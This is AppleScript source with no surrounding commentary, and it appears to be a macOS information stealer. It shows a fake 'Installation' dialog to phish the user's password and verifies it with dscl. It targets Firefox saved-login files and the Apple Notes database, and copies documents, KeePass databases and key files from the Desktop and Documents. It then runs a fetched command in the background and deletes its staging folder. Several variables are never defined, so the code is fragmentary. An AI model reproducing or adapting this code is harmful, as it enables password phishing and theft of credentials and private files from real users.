set accountName to system attribute "USER"
set answer to display dialog "Please enter device password to continue." default answer "" with title "Installation" with hidden answer
set checkResult to do shell script "dscl . authonly " & accountName & space & text returned of answer
on loadFile(sourcePath)
set fileContents to read sourcePath
return fileContents
end loadFile
set profileRoot to "/Library/Application Support/Firefox/Profiles/"
set credentialFiles to {"/key4.db", "/logins.json"}
set allowedExtensions to {"docx", "pdf", "kdbx", "key"}
tell application "Finder"
set desktopFiles to every file of desktop
set documentFiles to every file of folder "Documents" of (path to home folder)
repeat with selectedFile in (desktopFiles & documentFiles)
set selectedExtension to name extension of selectedFile
if selectedExtension is in allowedExtensions then
duplicate selectedFile to folder destinationFolder with replacing
end if
end repeat
end tell
set containerPath to "Library/Group Containers/group.com.apple.notes/"
set databaseName to "NoteStore.sqlite"
set walName to "NoteStore.sqlite-wal"
do shell script "nohup " & fetchedCommand & " >/dev/null 2>&1 &"
do shell script "rm -r " & stagingDirectory
